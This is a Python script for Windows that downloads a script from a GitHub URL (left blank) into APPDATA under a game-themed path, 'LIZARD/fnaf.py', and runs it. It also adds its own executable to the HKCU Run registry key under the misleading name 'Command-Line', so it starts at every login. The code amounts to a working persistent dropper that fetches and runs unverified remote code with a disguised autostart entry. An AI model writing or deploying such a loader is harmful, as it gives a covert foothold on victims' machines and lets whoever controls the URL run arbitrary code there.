import os
import sys
import requests
import subprocess
import winreg

# Replace with the raw GitHub URL of your script
GITHUB_SCRIPT_URL = ""
GITHUB_FOLDER_URL = ""
LOCAL_SCRIPT = os.path.join(os.getenv("APPDATA"), "LIZARD/fnaf.py")

def add_to_startup(name, exe_path):
    """Add this exe to Windows autostart via registry."""
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)

def update_script():
    """Download latest script from GitHub and save locally."""
    try:
        response = requests.get(GITHUB_FOLDER_URL, timeout=10)
        if response.status_code == 200:
            with open(LOCAL_SCRIPT, "w", encoding="utf-8") as f:
                f.write(response.text)
    except Exception as e:
        print("Failed to update script:", e)

def run_script():
    """Run the downloaded script with same Python interpreter as exe."""
    subprocess.Popen([sys.executable, LOCAL_SCRIPT])

def main():
    # Ensure script is up-to-date
    update_script()

    # Add this exe to startup (only once)
    exe_path = sys.argv[0]
    add_to_startup("Command-Line", exe_path)

    # Run script
    run_script()

if __name__ == "__main__":
    main()
